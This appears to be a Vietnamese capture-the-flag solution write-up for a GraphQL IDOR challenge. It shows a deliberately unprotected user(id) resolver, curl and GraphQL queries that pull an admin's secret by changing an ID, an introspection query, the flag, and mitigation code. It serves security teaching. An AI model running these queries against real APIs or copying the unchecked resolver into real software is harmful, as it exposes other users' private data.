# Thử thách 18: GraphAdmin - Giải pháp

## Loại lỗ hổng
**GraphQL Insecure Direct Object Reference (GraphQL IDOR / Lỗi kiểm soát truy cập)**

## Mô tả
Truy vấn `user(id)` của API GraphQL thiếu phần kiểm tra ủy quyền (Authorization). Điều này cho phép bất kỳ người dùng nào đã đăng nhập cũng có thể lấy được dữ liệu của bất kỳ tài khoản nào khác, bao gồm cả các secret của Admin.

## Mã nguồn chứa lỗ hổng
```javascript
// VULNERABLE: user(id) has no authorization check
const root = {
  user: ({ id }) => users[id] || null,   // không hề kiểm tra auth!
};
```

## Khai thác (Exploit)

### Bước 1: Đăng nhập
Sử dụng tài khoản thông thường: `bob` / `bob123`

### Bước 2: Truy cập GraphQL Explorer
Sau khi đăng nhập thành công, bạn sẽ được đưa tới trang `/graphql-ui`.

### Bước 3: Truy vấn dữ liệu của Admin
Truy vấn mặc định (trả về dữ liệu của chính bạn - ID 2):
```graphql
{ user(id: 2) { id username role email secret } }
```

Sửa tham số ID thành `1` (thường là ID của Admin):
```graphql
{ user(id: 1) { id username role email secret } }
```

### Bước 4: Nhận Cờ
Kết quả phản hồi (Response) sẽ làm lộ toàn bộ thông tin của Admin:
```json
{
  "data": {
    "user": {
      "id": 1,
      "username": "alice",
      "role": "admin",
      "email": "alice@corp.com",
      "secret": "FCTF{gr4phql_1d0r_n0_4uth}"
    }
  }
}
```

## Các phương pháp thay thế

### Sử dụng cURL
```bash
# Đầu tiên phải đăng nhập để lấy cookie
curl -c cookies.txt -d "username=bob&password=bob123" http://[host]/login

# Gửi GraphQL Query để lấy dữ liệu Admin
curl -b cookies.txt -X POST http://[host]/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ user(id: 1) { id username role email secret } }"}'
```

### Kỹ thuật GraphQL Introspection (Khảo sát lược đồ)
Gửi truy vấn nội quan (Introspection) để xem có những loại dữ liệu nào:
```graphql
{
  __schema {
    types {
      name
      fields {
        name
        type {
          name
        }
      }
    }
  }
}
```

### Truy vấn tất cả User
```graphql
{ users { id username role email secret } }
```
*(Lưu ý: Đôi khi developer che giấu trường secret ở truy vấn dạng danh sách `users`, nhưng lại quên che ở truy vấn theo cá nhân `user(id)`).*

## Flag
```
FCTF{gr4phql_1d0r_n0_4uth}
```

## Cách hoạt động
- GraphQL cho phép Client tự định nghĩa cấu trúc dữ liệu muốn lấy qua từng trường (field).
- Logic Resolver của `user(id)` trả về trực tiếp thông tin người dùng từ cơ sở dữ liệu mà không thèm kiểm tra xem người yêu cầu có quyền xem hay không.
- Đây là lỗi IDOR điển hình nhưng xảy ra ở môi trường API GraphQL.

## Biện pháp phòng ngừa (Mitigation)

### 1. Triển khai phân quyền (Authorization) bên trong Resolver
```javascript
const root = {
  user: ({ id }, context) => {
    const currentUser = context.session.uid;
    const currentRole = context.session.role;
    
    // Chỉ cho phép xem dữ liệu của chính mình, ngoại trừ Admin
    if (currentUser !== id && currentRole !== 'admin') {
      throw new Error('Access denied');
    }
    
    return users[id] || null;
  }
};
```

### 2. Phân quyền cấp độ trường (Field-level Authorization)
Áp dụng các Directive phân quyền:
```graphql
type User {
  id: Int
  username: String
  role: String
  secret: String @auth(requires: ADMIN)
}
```

### 3. Tắt tính năng Introspection trên Production
```javascript
const schema = new GraphQLSchema({
  query: QueryType,
  introspection: process.env.NODE_ENV !== 'production'
});
```

### 4. Giới hạn tỷ lệ và Phân tích độ phức tạp (Complexity Analysis)
Ngăn chặn các đòn DoS (Denial of Service) qua GraphQL bằng cách giới hạn độ sâu (Depth Limit) và tính toán chi phí (Complexity Limit) của từng truy vấn.
